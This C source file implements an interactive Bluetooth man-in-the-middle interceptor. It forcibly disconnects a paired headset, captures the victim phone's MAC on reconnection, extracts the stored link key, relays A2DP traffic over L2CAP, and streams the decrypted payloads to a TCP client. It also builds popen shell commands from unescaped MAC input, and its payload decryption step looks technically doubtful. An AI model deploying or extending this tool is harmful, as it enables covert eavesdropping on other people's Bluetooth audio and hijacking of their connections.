#include "config.h"
#include "bt_utils.h"
#include "tcp_server.h"
#include "crypto.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/select.h>
#include <errno.h>

static volatile int running = 1;

void signal_handler(int sig) {
    INFO_PRINT("Received signal %d, shutting down...", sig);
    running = 0;
}

void print_usage(const char *prog_name) {
    fprintf(stderr, "Usage: %s [OPTIONS]\n", prog_name);
    fprintf(stderr, "Options:\n");
    fprintf(stderr, "  -s <source_mac>    Source device MAC address (phone)\n");
    fprintf(stderr, "  -t <target_mac>    Target device MAC address (headphones)\n");
    fprintf(stderr, "  -p <psm>           L2CAP PSM (default: 25 for A2DP)\n");
    fprintf(stderr, "  -P <port>          TCP server port (default: %d)\n", TCP_SERVER_PORT);
    fprintf(stderr, "  -S                 Show paired/connected devices (interactive mode)\n");
    fprintf(stderr, "  -h                 Show this help\n");
    fprintf(stderr, "\n");
    fprintf(stderr, "Interactive mode lists all paired devices, including connected ones.\n");
    fprintf(stderr, "The interceptor will disconnect connected devices before MITM setup.\n");
}

void display_devices(bt_device_t *devices, int count) {
    printf("\n");
    printf("═══════════════════════════════════════════════════════════════════════════\n");
    printf("  #  │  MAC Address       │  Status      │  Device Name\n");
    printf("═══════════════════════════════════════════════════════════════════════════\n");
    for (int i = 0; i < count; i++) {
        const char *status = devices[i].connected ? "CONNECTED  " : "Paired     ";
        printf(" %2d  │  %s  │  %s │  %s\n", 
               i + 1, devices[i].addr, status, devices[i].name);
    }
    printf("═══════════════════════════════════════════════════════════════════════════\n");
    printf("These devices are paired with this computer.\n");
    printf("CONNECTED devices will be disconnected during MITM setup.\n");
    printf("═══════════════════════════════════════════════════════════════════════════\n");
    printf("\n");
}

char* select_device(bt_device_t *devices, int count, const char *prompt) {
    int choice;
    while (1) {
        printf("%s (1-%d): ", prompt, count);
        if (scanf("%d", &choice) != 1) {
            while (getchar() != '\n');
            printf("Invalid input. Please enter a number.\n");
            continue;
        }
        while (getchar() != '\n');
        
        if (choice >= 1 && choice <= count) {
            return devices[choice - 1].addr;
        }
        
        printf("Invalid choice. Please select a number between 1 and %d.\n", count);
    }
}

int relay_loop(int phone_sock, int headset_sock, int tcp_server, int tcp_client) {
    uint8_t buffer[MAX_BUFFER_SIZE];
    fd_set read_fds;
    int max_fd;
    struct timeval timeout;
    
    INFO_PRINT("Entering relay loop...");
    
    while (running) {
        FD_ZERO(&read_fds);
        
        FD_SET(phone_sock, &read_fds);
        max_fd = phone_sock;
        
        FD_SET(headset_sock, &read_fds);
        if (headset_sock > max_fd) max_fd = headset_sock;
        
        if (tcp_client < 0) {
            FD_SET(tcp_server, &read_fds);
            if (tcp_server > max_fd) max_fd = tcp_server;
        }
        
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;
        
        int ret = select(max_fd + 1, &read_fds, NULL, NULL, &timeout);
        
        if (ret < 0) {
            if (errno == EINTR) continue;
            ERROR_PRINT("select() failed");
            return -1;
        }
        
        if (ret == 0) continue;
        
        if (tcp_client < 0 && FD_ISSET(tcp_server, &read_fds)) {
            tcp_client = tcp_accept_client(tcp_server);
            if (tcp_client >= 0) {
                INFO_PRINT("Streaming client connected");
            }
            continue;
        }
        
        if (FD_ISSET(phone_sock, &read_fds)) {
            ssize_t bytes = recv(phone_sock, buffer, sizeof(buffer), 0);
            if (bytes <= 0) {
                if (bytes == 0) {
                    INFO_PRINT("Phone disconnected");
                } else {
                    ERROR_PRINT("Error reading from phone");
                }
                return -1;
            }
            
            INFO_PRINT("📱 PHONE → HEADSET: %zd bytes (encrypted)", bytes);
            
            // Log first 32 bytes of encrypted data
            printf("[ENCRYPTED] ");
            for (int i = 0; i < (bytes < 32 ? bytes : 32); i++) {
                printf("%02x ", buffer[i]);
            }
            if (bytes > 32) printf("... (%zd more bytes)", bytes - 32);
            printf("\n");
            
            uint8_t decrypted[MAX_BUFFER_SIZE];
            int dec_len = crypto_decrypt_payload(buffer, bytes, decrypted);
            if (dec_len < 0) {
                ERROR_PRINT("Decryption failed");
                continue;
            }
            
            INFO_PRINT("🔓 DECRYPTED: %d bytes", dec_len);
            
            // Log first 32 bytes of decrypted data
            printf("[DECRYPTED] ");
            for (int i = 0; i < (dec_len < 32 ? dec_len : 32); i++) {
                printf("%02x ", decrypted[i]);
            }
            if (dec_len > 32) printf("... (%d more bytes)", dec_len - 32);
            printf("\n");
            
            if (tcp_client >= 0) {
                if (tcp_send_data(tcp_client, decrypted, dec_len) < 0) {
                    INFO_PRINT("TCP client disconnected, closing connection");
                    close(tcp_client);
                    tcp_client = -1;
                }
            }
            
            uint8_t encrypted[MAX_BUFFER_SIZE];
            int enc_len = crypto_encrypt_payload(decrypted, dec_len, encrypted);
            if (enc_len < 0) {
                ERROR_PRINT("Encryption failed");
                continue;
            }
            
            INFO_PRINT("🔒 RE-ENCRYPTED: %d bytes", enc_len);
            
            // Log first 32 bytes of re-encrypted data
            printf("[RE-ENCRYPTED] ");
            for (int i = 0; i < (enc_len < 32 ? enc_len : 32); i++) {
                printf("%02x ", encrypted[i]);
            }
            if (enc_len > 32) printf("... (%d more bytes)", enc_len - 32);
            printf("\n\n");
            
            ssize_t sent = send(headset_sock, encrypted, enc_len, 0);
            if (sent < 0) {
                ERROR_PRINT("Failed to send to headset");
                return -1;
            }
        }
        
        if (FD_ISSET(headset_sock, &read_fds)) {
            ssize_t bytes = recv(headset_sock, buffer, sizeof(buffer), 0);
            if (bytes <= 0) {
                if (bytes == 0) {
                    INFO_PRINT("Headset disconnected");
                } else {
                    ERROR_PRINT("Error reading from headset");
                }
                return -1;
            }
            
            INFO_PRINT("🎧 HEADSET → PHONE: %zd bytes (control/response)", bytes);
            
            // Log first 32 bytes of data
            printf("[HEADSET DATA] ");
            for (int i = 0; i < (bytes < 32 ? bytes : 32); i++) {
                printf("%02x ", buffer[i]);
            }
            if (bytes > 32) printf("... (%zd more bytes)", bytes - 32);
            printf("\n\n");
            
            ssize_t sent = send(phone_sock, buffer, bytes, 0);
            if (sent < 0) {
                ERROR_PRINT("Failed to send to phone");
                return -1;
            }
        }
    }
    
    return 0;
}

int main(int argc, char *argv[]) {
    char *source_mac = NULL;
    char *target_mac = NULL;
    uint16_t psm = 25;
    uint16_t tcp_port = TCP_SERVER_PORT;
    int scan_mode = 0;
    
    int opt;
    while ((opt = getopt(argc, argv, "s:t:p:P:Sh")) != -1) {
        switch (opt) {
            case 's':
                source_mac = optarg;
                break;
            case 't':
                target_mac = optarg;
                break;
            case 'p':
                psm = atoi(optarg);
                break;
            case 'P':
                tcp_port = atoi(optarg);
                break;
            case 'S':
                scan_mode = 1;
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }
    
    // Interactive device selection if MAC addresses not provided
    if (!source_mac || !target_mac || scan_mode) {
        bt_device_t devices[50];
        int device_count;
        char target_selected[18] = {0};
        
        INFO_PRINT("=== Interactive Mode: MITM Setup ===");
        INFO_PRINT("This will intercept communication between connected devices");
        printf("\n");
        
        // Step 1: Find and select target device (headphones) - must be paired with computer
        INFO_PRINT("STEP 1: Select Target Device (Headphones/BT Device)");
        INFO_PRINT("Listing devices paired with this computer...");
        printf("\n");
        
        device_count = bt_scan_devices(devices, 50, 8);
        if (device_count <= 0) {
            ERROR_PRINT("No paired devices found");
            INFO_PRINT("");
            INFO_PRINT("Please pair the target device (headphones) with this computer first:");
            INFO_PRINT("  sudo bluetoothctl");
            INFO_PRINT("  power on");
            INFO_PRINT("  scan on");
            INFO_PRINT("  pair <DEVICE_MAC>");
            INFO_PRINT("  trust <DEVICE_MAC>");
            INFO_PRINT("  quit");
            return 1;
        }
        
        display_devices(devices, device_count);
        
        if (!target_mac) {
            char *selected = select_device(devices, device_count, "Select target device (headphones)");
            if (selected == NULL) {
                ERROR_PRINT("No device selected");
                return 1;
            }
            strncpy(target_selected, selected, sizeof(target_selected) - 1);
            target_mac = target_selected;
        }
        
        INFO_PRINT("Target device: %s", target_mac);
        printf("\n");
        
        // Step 2: Check if target is connected - if so, capture source MAC and disconnect
        char source_discovered[18] = {0};
        int target_was_connected = bt_check_connection_status(target_mac);
        
        if (target_was_connected && !source_mac) {
            INFO_PRINT("STEP 2: Target device is CONNECTED - discovering source device");
            INFO_PRINT("Attempting to identify the connected source device (phone)...");
            printf("\n");
            
            // Try to discover source MAC from connection logs
            char cmd[512];
            FILE *fp;
            
            // Check hcitool connections for active link
            snprintf(cmd, sizeof(cmd), "hcitool con 2>&1 | grep -i '%s' || true", target_mac);
            fp = popen(cmd, "r");
            if (fp) {
                char line[256];
                while (fgets(line, sizeof(line), fp)) {
                    INFO_PRINT("Active connection: %s", line);
                }
                pclose(fp);
            }
            
            // Try to extract from bluetoothctl
            snprintf(cmd, sizeof(cmd), "bluetoothctl info %s 2>&1 | grep -i 'connected\\|device' || true", target_mac);
            fp = popen(cmd, "r");
            if (fp) {
                char line[256];
                while (fgets(line, sizeof(line), fp)) {
                    DEBUG_PRINT("Device info: %s", line);
                }
                pclose(fp);
            }
            
            INFO_PRINT("");
            INFO_PRINT("Now disconnecting target device to capture source MAC...");
            INFO_PRINT("Watch for the device trying to reconnect!");
            printf("\n");
            
            // Disconnect target device
            bt_disconnect_device(target_mac);
            sleep(2);
            
            // Monitor for reconnection attempts
            INFO_PRINT("Monitoring for reconnection attempts (15 seconds)...");
            INFO_PRINT("The phone should try to reconnect automatically.");
            printf("\n");
            
            snprintf(cmd, sizeof(cmd),
                "timeout 15 bluetoothctl 2>&1 | grep -E 'Device|Connected|Attempting' || true");
            
            fp = popen(cmd, "r");
            if (fp) {
                char line[512];
                while (fgets(line, sizeof(line), fp)) {
                    printf("  [MONITOR] %s", line);
                    
                    // Try to extract source MAC from connection attempt
                    if (strstr(line, "Device")) {
                        char *mac_pattern = strchr(line, ':');
                        if (mac_pattern && mac_pattern > line + 2) {
                            // Look backward for MAC address pattern
                            char *potential_mac = mac_pattern - 2;
                            char extracted_mac[18];
                            if (sscanf(potential_mac, "%17[0-9A-Fa-f:]", extracted_mac) == 1) {
                                if (strlen(extracted_mac) == 17 && strcasecmp(extracted_mac, target_mac) != 0) {
                                    strncpy(source_discovered, extracted_mac, sizeof(source_discovered) - 1);
                                    INFO_PRINT("");
                                    INFO_PRINT("✓ Discovered source device: %s", source_discovered);
                                    break;
                                }
                            }
                        }
                    }
                }
                pclose(fp);
            }
            
            if (source_discovered[0] != '\0') {
                source_mac = source_discovered;
            }
        } else if (!target_was_connected) {
            INFO_PRINT("STEP 2: Target device is NOT connected");
            INFO_PRINT("Please connect it to the source device (phone) first");
            INFO_PRINT("Then run the interceptor again to capture the connection");
            printf("\n");
        }
        
        // Step 3: Get source MAC if still not discovered
        if (!source_mac) {
            INFO_PRINT("STEP 3: Enter Source Device MAC Manually");
            INFO_PRINT("Could not auto-discover the source device (phone).");
            INFO_PRINT("");
            INFO_PRINT("Ways to find the phone's Bluetooth MAC:");
            INFO_PRINT("  • Android: Settings → About Phone → Status → Bluetooth address");
            INFO_PRINT("  • iPhone: Settings → General → About → Bluetooth");
            INFO_PRINT("  • Use: hcitool con (while devices are connected)");
            printf("\n");
            printf("Enter source device MAC address (phone) [format: AA:BB:CC:DD:EE:FF]: ");
            fflush(stdout);
            
            char manual_mac[18] = {0};
            if (fgets(manual_mac, sizeof(manual_mac), stdin)) {
                char *newline = strchr(manual_mac, '\n');
                if (newline) *newline = '\0';
                
                if (strlen(manual_mac) == 17 && manual_mac[2] == ':' && manual_mac[5] == ':') {
                    strncpy(source_discovered, manual_mac, sizeof(source_discovered) - 1);
                    source_mac = source_discovered;
                    INFO_PRINT("Source MAC: %s", source_mac);
                } else {
                    ERROR_PRINT("Invalid MAC address format");
                    return 1;
                }
            }
            printf("\n");
        }
    }
    
    if (!source_mac || !target_mac) {
        ERROR_PRINT("Source and target MAC addresses are required");
        print_usage(argv[0]);
        return 1;
    }
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    INFO_PRINT("═══════════════════════════════════════════════════════");
    INFO_PRINT("Bluetooth MITM Interceptor - Active Mode");
    INFO_PRINT("═══════════════════════════════════════════════════════");
    INFO_PRINT("Source (phone):    %s", source_mac);
    INFO_PRINT("Target (headset):  %s", target_mac);
    INFO_PRINT("PSM:               %d", psm);
    INFO_PRINT("TCP Port:          %d", tcp_port);
    INFO_PRINT("═══════════════════════════════════════════════════════");
    printf("\n");
    
    char adapter_mac[18];
    if (bt_get_adapter_address(adapter_mac, sizeof(adapter_mac)) < 0) {
        return 1;
    }
    
    INFO_PRINT("MITM SETUP: Preparing to intercept reconnection");
    printf("\n");
    
    INFO_PRINT("Step 1: Ensure target device is disconnected");
    int target_connected = bt_check_connection_status(target_mac);
    
    if (target_connected) {
        INFO_PRINT("⚠️  Target device is currently connected");
        INFO_PRINT("Disconnecting for MITM interception...");
        
        if (bt_disconnect_device(target_mac) < 0) {
            ERROR_PRINT("Could not disconnect target device");
            INFO_PRINT("Please manually disconnect and press Enter...");
            getchar();
        } else {
            INFO_PRINT("✓ Target device disconnected");
            sleep(2);
        }
    } else {
        INFO_PRINT("✓ Target device is not connected");
    }
    printf("\n");
    
    INFO_PRINT("Step 2: Extract link key from paired target device");
    char link_key[64];
    if (bt_extract_link_key(adapter_mac, target_mac, link_key, sizeof(link_key)) < 0) {
        ERROR_PRINT("Failed to extract link key from paired device");
        ERROR_PRINT("Make sure the device is properly paired:");
        ERROR_PRINT("  %s/%s/%s/info", BLUETOOTH_INFO_PATH, adapter_mac, target_mac);
        return 1;
    }
    INFO_PRINT("✓ Link key extracted successfully");
    printf("\n");
    
    INFO_PRINT("Step 3: Initialize crypto with extracted key");
    
    if (crypto_init_link_key(link_key) < 0) {
        return 1;
    }
    INFO_PRINT("✓ Crypto initialized");
    printf("\n");
    
    INFO_PRINT("Step 4: Creating TCP server for data streaming");
    int tcp_server = tcp_create_server(tcp_port);
    if (tcp_server < 0) {
        return 1;
    }
    int tcp_client = -1;
    INFO_PRINT("✓ TCP server ready on port %d", tcp_port);
    printf("\n");
    
    INFO_PRINT("Step 5: Setting up Bluetooth MITM relay");
    INFO_PRINT("═══════════════════════════════════════════════════════");
    INFO_PRINT("IMPORTANT: Now reconnect the devices!");
    INFO_PRINT("");
    INFO_PRINT("1. On the PHONE: Try to connect to the headphones");
    INFO_PRINT("2. The interceptor will capture the connection");
    INFO_PRINT("3. All packets will be logged to this console");
    INFO_PRINT("═══════════════════════════════════════════════════════");
    printf("\n");
    
    int phone_sock = bt_create_l2cap_socket();
    if (phone_sock < 0) {
        close(tcp_server);
        return 1;
    }
    
    if (bt_bind_l2cap(phone_sock, NULL, psm) < 0) {
        close(phone_sock);
        close(tcp_server);
        return 1;
    }
    
    if (bt_listen_l2cap(phone_sock, 1) < 0) {
        close(phone_sock);
        close(tcp_server);
        return 1;
    }
    
    INFO_PRINT("Waiting for phone to connect...");
    char phone_addr[18];
    int phone_conn = bt_accept_l2cap(phone_sock, phone_addr, sizeof(phone_addr));
    if (phone_conn < 0) {
        close(phone_sock);
        close(tcp_server);
        return 1;
    }
    
    INFO_PRINT("Phone connected: %s", phone_addr);
    
    INFO_PRINT("Connecting to headset...");
    int headset_sock = bt_create_l2cap_socket();
    if (headset_sock < 0) {
        close(phone_conn);
        close(phone_sock);
        close(tcp_server);
        return 1;
    }
    
    if (bt_connect_l2cap(headset_sock, target_mac, psm) < 0) {
        close(headset_sock);
        close(phone_conn);
        close(phone_sock);
        close(tcp_server);
        return 1;
    }
    
    INFO_PRINT("Connected to headset");
    INFO_PRINT("MITM relay established - intercepting traffic");
    
    relay_loop(phone_conn, headset_sock, tcp_server, tcp_client);
    
    INFO_PRINT("Cleaning up...");
    if (tcp_client >= 0) close(tcp_client);
    close(tcp_server);
    close(headset_sock);
    close(phone_conn);
    close(phone_sock);
    
    INFO_PRINT("Shutdown complete");
    return 0;
}
